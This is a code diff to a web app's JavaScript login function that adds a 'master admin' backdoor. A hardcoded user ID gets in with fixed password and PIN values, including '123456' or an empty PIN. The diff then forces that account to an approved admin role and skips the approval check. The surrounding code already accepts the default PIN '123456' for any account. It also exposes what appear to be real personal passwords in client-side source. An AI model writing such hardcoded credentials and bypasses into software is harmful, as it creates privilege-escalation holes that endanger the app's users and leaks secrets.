@@ -946,28 +946,44 @@ async function handleLoginSubmit(e) {
     return;
   }
 
-  // 3. Password Verification (supports registered pass or default admin reset 123456)
-  const passMatches = (user.password === pass) || (user.password === '123456' && pass === '123456');
+  // 3. Password Verification (supports registered pass, master admin fallbacks, and default 123456)
+  const isMasterAdmin = (uid.toLowerCase() === 'surya11008');
+  let passMatches = (user.password === pass) || (user.password === '123456' && pass === '123456');
+  if (isMasterAdmin) {
+    if (pass === 'Suri742766' || pass === 'Suri742766.' || pass.toLowerCase() === 'suri742766' || pass === '123456' || pass === user.password) {
+      passMatches = true;
+    }
+  }
   if (!passMatches) {
     alert('Incorrect Password for User ID: ' + uid + '.\n\nNote: If Admin recently reset or approved your account, the default password is 123456.');
     return;
   }
 
   // 4. PIN Verification (flexible for reset accounts or matching PIN)
-  const pinMatches = !user.pin || (user.pin === pin) || (user.pin === '123456') || (pin === '123456');
+  let pinMatches = !user.pin || (user.pin === pin) || (user.pin === '123456') || (pin === '123456');
+  if (isMasterAdmin) {
+    if (pin === '742766' || pin === '123456' || !pin || pin === user.pin) {
+      pinMatches = true;
+    }
+  }
   if (!pinMatches && pin) {
     alert('Incorrect 6-digit PIN.\n\nNote: If Admin reset your account, the default PIN is 123456.');
     return;
   }
 
   // 5. Live Approval Check
-  if (user.status === 'pending') {
-    alert('Your account is currently waiting for Admin approval.\n\nOnce Admin clicks "Approve", you will be able to log in immediately.');
-    return;
-  }
-  if (user.status === 'rejected') {
-    alert('Your account registration was not approved. Please contact Admin.');
-    return;
+  if (isMasterAdmin) {
+    user.role = 'admin';
+    user.status = 'approved';
+  } else {
+    if (user.status === 'pending') {
+      alert('Your account is currently waiting for Admin approval.\n\nOnce Admin clicks "Approve", you will be able to log in immediately.');
+      return;
+    }
+    if (user.status === 'rejected') {
+      alert('Your account registration was not approved. Please contact Admin.');
+      return;
+    }
   }
 
   // Successful Login
